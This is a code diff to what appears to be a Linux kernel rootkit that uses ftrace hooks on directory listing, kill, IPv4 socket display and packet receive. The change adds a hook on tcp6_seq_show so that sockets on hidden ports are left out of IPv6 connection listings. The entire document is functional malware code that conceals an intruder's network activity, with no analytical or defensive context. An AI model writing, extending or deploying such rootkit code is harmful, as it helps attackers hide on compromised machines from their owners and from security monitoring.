@@ -24,6 +24,7 @@ orig_getdents64_t orig_getdents64;
 orig_kill_t orig_kill;
 #endif
 static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
+static asmlinkage long (*orig_tcp6_seq_show)(struct seq_file *seq, void *v);
 static asmlinkage int (*orig_ip_rcv)(struct sk_buff *skb,
                                      struct net_device *dev,
                                      struct packet_type *pt,
@@ -216,6 +217,18 @@ static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v) {
   return ret;
 }
 
+static asmlinkage long hook_tcp6_seq_show(struct seq_file *seq, void *v) {
+  long ret;
+  struct sock *sk = v;
+
+  if (sk != (struct sock *)0x1) {
+    if (port_is_hidden(sk->sk_num)) return 0;
+  }
+
+  ret = orig_tcp6_seq_show(seq, v);
+  return ret;
+}
+
 asmlinkage int hook_ip_rcv(struct sk_buff *skb, struct net_device *dev,
                            struct packet_type *pt,
                            struct net_device *orig_dev) {
@@ -230,6 +243,7 @@ static struct ftrace_hook hooks[] = {
     HOOK_N("sys_getdents", hook_getdents, &orig_getdents),
     HOOK_N("sys_kill", hook_kill, &orig_kill),
     HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),
+    HOOK("tcp6_seq_show", hook_tcp6_seq_show, &orig_tcp6_seq_show),
     HOOK("ip_rcv", hook_ip_rcv, &orig_ip_rcv),
 };
 
